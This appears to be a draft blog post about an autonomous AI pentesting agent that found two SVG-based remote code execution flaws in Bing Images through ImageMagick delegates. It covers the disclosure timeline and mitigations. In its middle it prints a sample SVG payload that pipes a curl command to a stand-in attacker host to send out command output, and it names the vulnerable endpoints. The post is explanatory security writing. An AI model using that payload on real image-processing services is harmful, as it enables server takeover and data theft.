---
title: "How an AI Pentester Chained an SVG Upload Into Root on Bing"
description: "XBOW's autonomous pentesting agent found two critical RCEs in Bing Images by abusing how ImageMagick handles SVG — one via public upload, one via the crawler."
pubDate: 2026-07-26
tags: ["security", "appsec", "ai-agents", "vulnerability-research"]
draft: true
---

In March 2026, Microsoft's Bing Images service had two unauthenticated remote code execution holes, both rated CVSS 9.8, both reachable without a single click from a victim. Send the right file, and a Bing image-processing worker would run your command as `NT AUTHORITY\SYSTEM` on Windows or as root on Linux. No login, no user interaction, no exploit chain that needed social engineering — just a file upload.

What makes this one worth a closer look isn't the severity. Critical RCEs get found and patched constantly. It's who found it: XBOW, an autonomous AI pentesting platform, not a human researcher — and the finding was strong enough to put XBOW in the top 10 of Microsoft's own bug bounty leaderboard, the first AI system to land there. Microsoft fixed the bugs quietly in March; XBOW held its technical write-up until July 23, 2026, at Microsoft's request, before publishing the mechanics.

## What XBOW actually is

XBOW isn't "an LLM with a nmap wrapper." Per XBOW's own description of the platform, it's a coordinated fleet: a coordinator agent decides what to test and in what order, then directs large numbers of worker agents to attack a target's surface in parallel, chaining vulnerabilities using an offensive toolkit rather than running a single fixed scan. A separate validation layer independently confirms that a found vulnerability is actually exploitable before it's reported — the explicit point being to suppress the false positives and hallucinated findings that plague naive "point an LLM at a target" setups.

That combination — breadth from parallel agents, plus independent validation — is what let it operate against live Microsoft infrastructure and produce findings clean enough for MSRC to accept and patch, not just a report that looked plausible.

## The bug: SVG is XML, not pixels

Both critical findings trace back to the same root cause: ImageMagick's delegate mechanism, invoked while processing untrusted SVG input. This is a decades-old class of bug (the 2016 "ImageTragick" disclosures made the same mechanism famous), and it keeps resurfacing because the underlying design choice never went away.

ImageMagick delegates let the library hand off certain resource references to external programs instead of reading them directly — useful for fetching a remote image referenced inside a file, for instance. The problem is what counts as a "reference." SVG is an XML format, not a pixel grid, so an SVG file can embed references like `xlink:href` pointing at another resource. If that reference string begins with a pipe character (`|`), ImageMagick's delegate handling passes the rest of the string to a shell instead of treating it as a filename.

Illustrating the general shape of that bug class (not XBOW's specific Bing payload, which hasn't been published in full):

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="|curl http://attacker.example/exfil?out=$(id)" />
</svg>
```

Hand that file to a pipeline that runs it through ImageMagick as if it were any other uploaded image, and the "image reference" is executed as a shell command on whatever host is doing the processing. As XBOW's write-up put it, plainly: *"applications treat image helpers as plumbing. Attackers treat them as parsers."* Any code path that quietly delegates to ImageMagick — thumbnailing, reverse image search, format conversion — inherits this if untrusted SVG reaches it and dangerous delegates/coders aren't explicitly disabled.

## Two ways into the same pipeline

What made this a pair of critical CVEs instead of one is that XBOW found two independent, unauthenticated paths into the same vulnerable processing code:

**CVE-2026-32194** — direct upload. Bing's public "Search by Image" feature accepts an `imageBin` field, a base64-encoded image blob, posted to the `/images/kblob` endpoint. No authentication required. Submit a base64-encoded SVG built to exploit the delegate handling described above, and the worker that processes it executes your command.

**CVE-2026-32191** — the crawler as attack surface. This one doesn't touch the upload endpoint at all. Bing accepts an `imgurl` parameter pointing at an SVG hosted anywhere on the internet, and `bingbot/2.0` fetches it and runs it through the identical processing pipeline. An attacker never has to touch Bing's own infrastructure directly — they just have to get their SVG hosted somewhere Bing's crawler will fetch it, which is a much lower bar than finding an authenticated upload path.

That second path is the more interesting engineering lesson. Teams routinely lock down and threat-model user-facing upload forms — that's the obvious attack surface, the one security reviews default to scrutinizing. A crawler fetching content on the internet at large and feeding it into the exact same processing code gets far less attention, even though it's functionally an *unauthenticated remote file upload with extra steps*. If the processing logic is shared, the crawler-fetch path inherits every vulnerability the upload path has, plus SSRF-style reach into whatever network the crawling infrastructure can see.

## Impact and severity

Both CVEs were rated CVSS 9.8 — critical, no authentication, no user interaction. Successful exploitation gave:

- **Windows workers**: execution as `NT AUTHORITY\SYSTEM`, with `SeImpersonatePrivilege` and `SeDebugPrivilege` enabled — enough to pivot broadly within the host.
- **Linux workers**: execution as root (`uid=0`, `gid=0`).

That's full compromise of the machine doing the image processing, from either an anonymous upload or a crawled URL, with no chain beyond "get ImageMagick to run your command."

A third CVE, CVE-2026-21536 (an unrestricted upload flaw in the unrelated Microsoft Devices Pricing Program), was also credited to XBOW around the same period and contributed to the leaderboard ranking — but it's a different product and a different bug class, worth naming for accuracy rather than folding into this SVG story.

## Disclosure, and what happens next

Microsoft's CVE advisories for the Bing Images flaws were published March 19, 2026, with the vulnerabilities already fixed server-side by then and the advisories stating no customer action was required and no known public exploitation at the time. XBOW held back the technical mechanics — the actual "how" behind the CVE numbers — until July 23, 2026, at Microsoft's request, which is the more conservative end of standard coordinated disclosure: patch first, confirm the fix holds, then let the finder publish specifics.

## What this means if you run anything that touches ImageMagick

The mitigation for this specific bug class is well established and predates XBOW's find by a decade: ImageMagick ships a `policy.xml` mechanism to disable dangerous coders and delegates outright, and the standing advice for any service accepting untrusted images has been to disable SVG/MSL/delegate processing unless you specifically need it, or isolate image processing into a sandboxed, unprivileged worker with no meaningful blast radius if it's compromised. Bing's own fix, whatever its specifics, necessarily did one or both of those.

The broader lesson is less about ImageMagick and more about surface inventory. If your service has *any* code path that ingests attacker-influenced content and hands it to an image, document, or media library — whether that content arrives via a user-facing upload form or via a background fetcher, crawler, or webhook consumer — that fetch path needs the same threat model as the upload form, not a lighter one. It's easy to review the form because it's visible in the product. It's easy to forget the crawler because nobody thinks of it as "user input."

And the fact that it was an autonomous agent, not a person, that chained these two paths together and got Microsoft to patch and credit them is itself worth sitting with: MSRC's bug bounty program is not set up to rubber-stamp AI-generated noise, and XBOW's finding cleared that validation bar against production infrastructure at one of the world's largest software companies. Whatever one thinks about AI-assisted security research generally, this wasn't a plausible-sounding report that turned out to be wrong — it was a validated, reproducible root-level compromise.

## Sources

- [Bing Images RCEs: How XBOW Found Three Critical Flaws — XBOW](https://xbow.com/blog/bing-images-rce-vulnerabilities)
- [Bing Images Flaws Let Crafted SVGs Run as SYSTEM/root — The Hacker News](https://thehackernews.com/2026/07/bing-images-flaws-let-crafted-svgs-run.html)
- [Bing Images Bugs Let Anyone Run Code as SYSTEM — CyberKendra](https://www.cyberkendra.com/2026/07/bing-images-bugs-let-anyone-run-code-as.html)
